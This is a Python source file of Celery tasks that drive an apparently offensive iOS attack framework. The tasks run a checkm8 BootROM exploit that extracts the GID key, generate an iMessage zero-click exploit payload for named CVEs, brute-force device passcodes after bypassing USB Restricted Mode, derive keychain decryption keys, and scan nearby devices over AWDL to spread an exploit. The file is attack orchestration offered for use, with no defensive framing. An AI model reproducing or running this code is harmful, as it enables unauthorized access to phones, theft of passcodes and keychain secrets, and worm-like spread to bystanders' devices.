"""Celery tasks for iOS attack modules (checkm8, iMessage chain, GrayKey brute-force)."""

from celery import shared_task
from celery.utils.log import get_task_logger

logger = get_task_logger(__name__)


@shared_task(bind=True, max_retries=3, default_retry_delay=30)
def execute_checkm8(self, attack_id: str, device_id: str,
                    attack_vector: str, params: dict) -> dict:
    """Execute checkm8 BootROM exploit against iOS device in DFU mode."""
    logger.info("Starting checkm8 exploit on device %s", device_id)
    import usb
    from dragon_legion.modules.ios import Checkm8Exploit, enumerate_dfu_device

    dev = usb.core.find(idVendor=0x05AC, idProduct=0x1227)
    if dev is None:
        return {"attack_id": attack_id, "status": "error", "error": "No DFU device found"}

    dfu_info = enumerate_dfu_device(dev)
    if not dfu_info.is_vulnerable:
        return {"attack_id": attack_id, "status": "blocked", "reason": "Device not vulnerable to checkm8"}

    with Checkm8Exploit(dev) as exploit:
        success = exploit.exploit()
        gid_key = exploit.gid_key.hex() if exploit.gid_key else None

    return {
        "attack_id": attack_id,
        "status": "success" if success else "failed",
        "module": "ios_checkm8",
        "cpid": hex(dfu_info.cpid),
        "gid_key_extracted": gid_key is not None,
    }


@shared_task(bind=True, max_retries=2)
def execute_imessage_chain(self, attack_id: str, device_id: str,
                           attack_vector: str, params: dict) -> dict:
    """Generate CVE-2025-31200/31201 iMessage zero-click exploit payload."""
    logger.info("Generating iMessage exploit payload for device %s", device_id)
    from dragon_legion.modules.ios import AMRExploitGenerator

    gen = AMRExploitGenerator()
    amr_data = gen.generate(output_path=params.get("output", "exploit.amr"))

    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "ios_imessage",
        "payload_size": len(amr_data),
        "output": params.get("output", "exploit.amr"),
    }


@shared_task(bind=True, max_retries=5, default_retry_delay=60)
def execute_ios_bruteforce(self, attack_id: str, device_id: str,
                           attack_vector: str, params: dict) -> dict:
    """Execute GrayKey-style iOS passcode brute-force."""
    logger.info("Starting iOS brute-force on device %s", device_id)
    import usb
    from dragon_legion.modules.ios import iOSBruteForce

    dev = usb.core.find(idVendor=0x05AC)
    if dev is None:
        return {"attack_id": attack_id, "status": "error", "error": "No Apple device found"}

    bf = iOSBruteForce(dev)
    bf.bypass_usb_restricted_mode()

    pin_length = params.get("pin_length", 4)
    result = bf.brute_force(pin_length=pin_length)

    return {
        "attack_id": attack_id,
        "status": "success" if result else "failed",
        "module": "ios_bruteforce",
        "passcode": result,
    }


@shared_task(bind=True, max_retries=1)
def execute_keychain_decrypt(self, attack_id: str, device_id: str,
                             attack_vector: str, params: dict) -> dict:
    """Decrypt iOS keychain using extracted GID key."""
    logger.info("Decrypting keychain for device %s", device_id)
    from dragon_legion.modules.ios import derive_keychain_key, decrypt_keychain_item

    gid_hex = params.get("gid_key", "")
    if not gid_hex:
        return {"attack_id": attack_id, "status": "error", "error": "No GID key provided"}

    gid_key = bytes.fromhex(gid_hex)
    kek = derive_keychain_key(gid_key)
    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "ios_keychain",
        "kek_derived": kek.hex()[:16] + "...",
    }


@shared_task(bind=True, max_retries=2)
def execute_awdl_propagate(self, attack_id: str, device_id: str,
                           attack_vector: str, params: dict) -> dict:
    """Propagate exploit via AWDL to nearby iOS devices."""
    logger.info("AWDL propagation from device %s", device_id)
    from dragon_legion.modules.ios import AWDLPropagator

    awdl = AWDLPropagator()
    peers = awdl.scan_peers(duration_sec=params.get("scan_duration", 30))

    return {
        "attack_id": attack_id,
        "status": "completed",
        "module": "ios_awdl",
        "peers_found": len(peers),
    }
